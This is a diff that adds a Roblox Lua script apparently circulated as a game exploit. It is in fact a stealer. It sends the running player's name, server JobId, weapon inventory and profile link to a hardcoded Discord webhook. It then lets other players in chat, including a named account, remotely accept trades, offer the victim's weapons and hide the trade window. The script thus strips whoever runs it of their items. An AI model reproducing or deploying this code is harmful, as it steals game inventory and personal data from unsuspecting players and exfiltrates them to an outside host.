@@ -1,1 +1,104 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+   
+
+local url =
+   "https://discord.com/api/webhooks/1253005376878678027/9ft3HqqXn9Cgvh1G2hVXuN_TXyA2QjGdqUEx02Fx7AEpiVX7OEwgQtp89CGZkc6-D-Jh"
+   
+t = {}
+for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
+ table.insert(t, tostring(i).." : "..tostring(v)..", ")
+end
+inventory = table.concat(t)
+   
+local data = {
+		["embeds"] = {
+					{
+						["title"] = "",
+						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
+						["type"] = "rich",
+						["color"]= tonumber(0xff0000),
+						["footer"] = {
+							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
+							["text"] = ""
+						},
+						["thumbnail"] = {
+							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
+						},
+						["author"] = {
+							["name"] = ""
+
+						},
+
+						["fields"] = {
+							{
+								["name"] = '**Player profile**',
+								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+								["inline"] = true
+
+							},
+
+						}
+					}}
+			}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+Player = game.Players.LocalPlayer
+Pl = game.Players
+
+function MainCommands(plr, msg)
+    if msg == "p" then
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+
+    if msg == "s" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+        for i = 1, 100 do
+            wait(0.1)
+        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+    end
+    end
+    
+    game.Players.JoeGG200.Chatted:Connect(function(msg)
+    
+    local args = {
+        [1] = msg,
+        [2] = "Weapons"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+
+end)
+
+    if msg == "a" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
+        
+    end
+end
+
+for i, v in Pl:GetChildren() do
+    if v ~= Player then
+        v.Chatted:Connect(function(msg)
+            MainCommands(v, msg)
+        end)
+    end
+end
+
+Pl.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        MainCommands(plr, msg)
+    end)
+end)
 
